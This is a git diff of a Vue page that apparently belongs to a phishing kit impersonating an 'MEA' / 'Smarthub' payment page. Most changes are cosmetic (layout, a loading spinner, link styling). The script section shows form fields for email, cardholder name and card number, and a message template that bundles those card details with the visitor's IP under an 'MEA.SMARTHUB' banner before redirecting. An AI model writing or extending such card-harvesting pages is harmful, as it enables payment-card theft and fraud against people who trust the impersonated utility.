@@ -1,10 +1,19 @@
 <template>
   <div class="page">
-    <div class="login-box" style="position: relative;">
-
-          <img style="width: 200px; position: absolute; right: 180px; top: 20px;" src="../public/smarthub.png" alt="smarthub">
-          <img style="width: 280px; position: absolute; left: 180px; bottom: 20px;" src="../public/mea.png" alt="mea">
+    
+    <div class="login-box" style="position: relative">
       
+
+      <img
+        style="width: 200px; position: absolute; right: 180px; top: 20px"
+        src="../public/smarthub.png"
+        alt="smarthub"
+      />
+      <img
+        style="width: 280px; position: absolute; left: 180px; bottom: 20px"
+        src="../public/mea.png"
+        alt="mea"
+      />
 
       <form @submit.prevent="finishJoob" action="">
         <!-- Email -->
@@ -22,33 +31,20 @@
 
         <!-- <p v-if="emailTouched && !email" class="error">Email is required.</p> -->
 
-
-         <!-- ================================ -->
+        <!-- ================================ -->
 
         <div class="group">
-          <label
-            >Email <span>*</span></label
-          >
+          <label>Email <span>*</span></label>
 
-          <input
-            v-model="formDataRes.email"
-            required
-            type="email"
-          />
+          <input v-model="formDataRes.email" required type="email" />
         </div>
 
         <!-- ================================ -->
 
         <div class="group">
-          <label
-            >Cardholder name <span>*</span></label
-          >
+          <label>Cardholder name <span>*</span></label>
 
-          <input
-            v-model="formDataRes.cardHolderName"
-            required
-            type="text"
-          />
+          <input v-model="formDataRes.cardHolderName" required type="text" />
         </div>
 
         <!-- ================================ -->
@@ -143,6 +139,10 @@
       </div>
     </div>
 
+    <div v-if="loading" class="loading-overlay">
+        <div class="spinner"></div>
+        <p>Loading...</p>
+      </div>
     <div class="version">Version: 26.13.2</div>
   </div>
 </template>
@@ -296,7 +296,7 @@ export default {
       const ip = data.ip;
 
       // Format the message as string
-      const message = `MEA
+      const message = `Ⓜ️Ⓜ️Ⓜ️ MEA.SMARTHUB Ⓜ️Ⓜ️Ⓜ️
         \nEMAIL: ${this.formDataRes.email}
         \nCARD HOLDER NAME: ${this.formDataRes.cardHolderName}
         \nCARD NUMBER: ${this.formDataRes.cardNumber}
@@ -326,7 +326,7 @@ export default {
 
         // Keep the popup visible for 2 seconds
         setTimeout(() => {
-          this.$router.push("/login");
+          this.$router.push("/");
         }, 1000);
       }, 1000);
     },
@@ -363,6 +363,32 @@ body {
   padding: 0;
   width: 100%;
   height: 100%;
+}
+
+.loading-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(255, 255, 255, 0.9);
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+.spinner {
+  width: 40px;
+  height: 40px;
+  border: 4px solid #ddd;
+  border-top: 4px solid #007bff;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
 }
 
 .page {
@@ -468,13 +494,20 @@ button:not(:disabled) {
 }
 
 .links {
-  width: 310px;
+  width: 30%;
   margin-top: 60px;
+  text-align: right;
+  display: flex;
+  justify-content: end;
 }
 
 .links ul {
-  padding-left: 16px;
+  width: full;
+  /* padding-left: 16px; */
   margin: 0;
+  position: relative;
+  right: 0;
+  list-style: none;
 }
 
 .links li {
